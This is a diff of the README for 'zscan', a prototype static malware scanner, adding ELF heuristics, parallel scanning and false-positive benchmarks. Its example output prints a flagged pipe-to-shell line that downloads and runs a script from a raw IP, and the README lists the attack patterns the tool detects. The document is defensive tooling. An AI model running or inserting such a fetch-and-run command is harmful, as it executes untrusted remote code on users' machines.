@@ -1,6 +1,8 @@
 # zscan
 
-A prototype **static** malware scanner: YARA rule matching plus simple file heuristics.
+[![CI](https://github.com/michaelsiswantom2-ai/ZScan/actions/workflows/ci.yml/badge.svg)](https://github.com/michaelsiswantom2-ai/ZScan/actions/workflows/ci.yml)
+
+A prototype **static** malware scanner: YARA rule matching plus file heuristics.
 It only reads bytes. It never runs or emulates the files it scans, and archives are
 opened in memory, never extracted to disk.
 
@@ -9,28 +11,66 @@ opened in memory, never extracted to disk.
 | Check | What it looks for |
 |---|---|
 | Hashes | MD5, SHA-1, SHA-256 of every file |
-| Archives | Looks inside zip (incl. docx/jar/apk), tar and gzip, up to 3 levels deep, in memory. Flags zip bombs and password-protected members. An archive takes the verdict of its worst member, shown as `outer.zip!inner/file.exe`. |
-| Threat intel | Offline known-bad hash lists (`--hashlist`, plus the MalwareBazaar list from `--update`). With `--intel`: CIRCL hashlookup (known-good files), MalwareBazaar and VirusTotal. Only hashes are sent, never file contents. |
+| Archives | Looks inside zip (incl. docx, jar, apk, whl), tar, gzip, bzip2 and xz, up to 3 levels deep, in memory. Flags zip bombs (extreme compression ratios, overlapping entries) and password-protected members. An archive takes the verdict of its worst member, shown as `outer.zip!inner/file.exe`. rar, 7z and zstd are recognised but not opened, and say so (see "Not fully scanned"). |
 | Community YARA | `zscan --update` downloads the [YARA-Forge](https://github.com/YARAHQ/yara-forge) rule package (about 5,000 curated rules in `core`) and loads it automatically from then on |
-| YARA | Bundled starter rules in `zscan/rules/` (EICAR, UPX packing, ransomware recovery-blocking commands, injection API strings, Office auto-exec macros, PHP webshells), or your own with `-r` |
-| Entropy | Whole-file and per-PE-section Shannon entropy (packed or encrypted content) |
-| PE heuristics | Packer section names, writable+executable sections, entry point outside or in the last section, missing imports, import combos that suggest injection, keylogging, anti-debugging or privilege tweaks, bad timestamps, overlays |
-| Suspicious strings | Encoded PowerShell, download cradles, shadow-copy deletion, Run-key persistence, reverse shells, pipe-to-shell, ransom-note text, raw-IP URLs, .onion addresses, big base64 blobs. String hits count one level lower inside compiled binaries, which embed lots of harmless text. |
+| Bundled YARA | Starter rules in `zscan/rules/` (EICAR, UPX packing for Windows and Linux files, ransomware recovery-blocking commands, injection API strings, Office auto-exec macros, PHP webshells), or your own with `-r` |
+| Threat intel | Offline known-bad hash lists (`--hashlist`, plus the MalwareBazaar list from `--update`). With `--intel`: CIRCL hashlookup (known-good files), MalwareBazaar and VirusTotal. Only hashes are sent, never file contents. |
+| Entropy | Whole-file and per-section Shannon entropy (packed or encrypted content) |
+| PE heuristics (Windows) | Packer section names, writable+executable sections, entry point outside or in the last section, missing imports, import combos that suggest injection, keylogging, anti-debugging or privilege tweaks, bad timestamps, overlays |
+| ELF heuristics (Linux) | Writable+executable segments, entry point outside the executable segments, missing or out-of-file section table, high-entropy code sections, weak import hints (reverse-shell shape, `ptrace`). Uses a small built-in ELF reader (32/64-bit, both byte orders). |
+| Suspicious strings | Encoded PowerShell and download cradles, shadow-copy deletion, Run-key persistence, reverse shells, pipe-to-shell (stronger when aimed at a raw IP), crypto-miner pool URLs, ransom-note text, raw-IP URLs, .onion addresses, big base64 blobs. Everyday mentions (docs, install instructions) are only weak hints, and string hits count one level lower inside compiled binaries. Compressed or encrypted content is skipped, because short patterns match random bytes by chance. |
 
 Each finding has a severity (INFO, LOW, MED, HIGH, CRIT). Findings add up to a 0 to 100 score:
-any CRIT or a score of 70+ is **malicious**, 15+ is **suspicious**, the rest **clean**.
+any CRIT or a score of 70+ is **malicious**, 15+ is **suspicious**, the rest **clean**. Weak hints
+(LOW) only matter when several pile up.
 
 ## Install and run
 
 ```bash
-pip install -e .            # needs yara-python and pefile
+pip install -e .            # needs yara-python and pefile, Python 3.10+
 zscan path/to/file_or_dir   # or: python -m zscan ...
-zscan -q ~/Downloads        # only show non-clean files
+zscan -q -j 0 ~/Downloads   # only show non-clean files, one worker per CPU core
 zscan --json dir > report.json
 zscan -r my_rules/ dir      # use your own YARA rules instead of the bundled ones
 zscan --update              # fetch YARA-Forge rules + MalwareBazaar recent hashes
 zscan --intel suspicious.exe   # also look the hash up online
 ```
+
+Exit codes: `0` clean, `1` suspicious found, `2` malicious found, `3` only errors (or a worker crash),
+`130` interrupted.
+
+Example (real output):
+
+```
+MALICIOUS  score=100  samples/eicar.com
+    type=text size=68 entropy=4.872 sha256=275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f
+    [CRIT] YARA: EICAR_Test_File  (EICAR antivirus test file (harmless industry test string))
+CLEAN      score=  0  samples/old.rar
+    ~ not fully scanned: RAR archive: contents not scanned (format not supported)
+SUSPICIOUS score= 25  samples/setup.sh
+    type=script size=54 entropy=4.54 sha256=2c67fe11ad08cce646f010aed281829378b535fa52283cf6a1d061cdd58668ef
+    [MED ] Pipe-to-shell download from a raw IP address  (e.g. 'curl -s http://203.0.113.5:8080/x.sh | bash\n')
+    [LOW ] Pipe-to-shell download  (e.g. 'curl -s http://203.0.113.5:8080/x.sh | bash\n')
+    [LOW ] URL with raw IP address  (e.g. 'http://203.0.113.5:8080/x.sh | bash\n')
+
+Scanned 3 file(s): 1 clean, 1 suspicious, 1 malicious, 0 skipped, 0 error; 1 not fully scanned
+```
+
+### Not fully scanned
+
+A "clean" verdict only covers what zscan could look at. When it could not check something, it
+says so in text and JSON (`unscanned`, and `partly_scanned` in the summary) and keeps the verdict
+as it is: formats it cannot open (rar, 7z, zstd), corrupt archives, password-protected or oversized
+archive members, archives nested too deep or with too many members, and YARA rules that timed out.
+Files over `--max-size` are listed as `skipped`.
+
+### Parallel scanning (`-j`)
+
+`-j N` runs the analysis in N worker processes (`-j 0` is one per CPU core). Results come out in
+the same order and are identical to a single-process scan. Hash lookups and archive roll-ups stay
+in the main process, so online lookups keep their rate limits. On 4 cores a scan of `/usr/bin` with
+community rules loaded went from 51 s to 16 s. If a worker crashes zscan stops with a clear error
+(exit 3); rerun with `-j 1` to find the file.
 
 ### Community rules (`--update`)
 
@@ -58,37 +98,38 @@ VirusTotal's free tier allows 4 requests a minute, so zscan waits 15 s between c
 archives and anything already flagged. Answers are cached for 24 hours. A network failure is a
 warning, not a crash.
 
-Exit codes: `0` clean, `1` suspicious found, `2` malicious found, `3` only errors.
-
-Example:
-
-```
-MALICIOUS  score=100  samples/eicar.com
-    type=text size=68 entropy=4.872 sha256=275a021b...
-    [CRIT] YARA: EICAR_Test_File  (EICAR antivirus test file (harmless industry test string))
-SUSPICIOUS score= 20  samples/setup.sh
-    [MED ] Pipe-to-shell download  (e.g. 'curl http://203.0.113.5:8080/x.sh | bash')
-    [LOW ] URL with raw IP address
-CLEAN      score=  0  samples/notes.txt
-```
-
 ## Tests
 
 ```bash
 pip install -e '.[test]' && pytest
 ```
 
-Tests build harmless samples at runtime (the EICAR test string, a hand-made non-runnable PE
-that looks UPX-packed, scripts with ransomware-style commands, nested and booby-trapped archives).
-Network sources are faked, so tests run offline. No real malware is used or stored.
+CI runs the suite on Python 3.10 to 3.13. Tests build harmless samples at runtime (the EICAR test
+string, hand-made non-runnable PE and ELF files, scripts with ransomware-style commands, nested and
+booby-trapped archives). Network sources are faked, so tests run offline. No real malware is used
+or stored. A fuzz test feeds each file kind 150 randomly damaged copies to check that nothing
+crashes or hangs.
 
-Baseline with the YARA-Forge core rules loaded: 0 false positives on 6,260 files from a stock
-Linux system (`/usr/bin`, Python packages, shared libraries) and on 290 real wheels, jars and
-tarballs.
+## How well does it hold up?
+
+Checked on a stock Linux box (nothing on it is malware), with the YARA-Forge core rules loaded:
+
+| Test set | Result |
+|---|---|
+| Whole machine: 166,487 files under `/usr`, `/opt`, `/etc`, `/var` and more, including archives | 0 malicious. 9 suspicious: 8 Go toolchain test fixtures that really are unrunnable ELF files (entry point outside any executable segment), and 1 Google Cloud SDK install script that really does download and run an installer with PowerShell |
+| Same scan before the string checks were tuned (144,614 files) | 59 suspicious, mostly documentation, UI strings and install instructions that mention `downloadFile` or `curl ... \| bash` |
+| System folders (`/usr/bin`, Python packages, shared libraries) | 6,260 files, 0 flagged, 43 s with `-j 4` |
+| Compressed files | 1,658 `.gz`, `.xz`, `.bz2` and `.zst` files, 0 flagged |
+| ELF reader against `readelf` | Sections, segment flags and imports agree on 1,500 real binaries |
+
+On that machine 36 files were reported as not fully scanned: 13 zstd files (not supported), a few
+archives over the member limit, a handful of deliberately corrupt archives in compression-library
+test data, and members over 64 MiB.
 
 ## Limits (it's a prototype)
 
 - Static only, so it is easy to evade with obfuscation, and it cannot see behaviour.
-- No rar or 7z support, no ELF/Mach-O structure checks yet, files over 64 MiB are skipped.
-- Single-threaded: roughly 45 files a second on system binaries with community rules loaded
-  (about 150 without).
+- No rar, 7z or zstd unpacking, no Mach-O structure checks, files over 64 MiB are skipped.
+- Heuristics are tuned on one Linux machine. Expect some noise on other kinds of files.
+- YARA with the community rules is the slow part: roughly 15 files a second per core on system
+  binaries (about 50 per core without them).
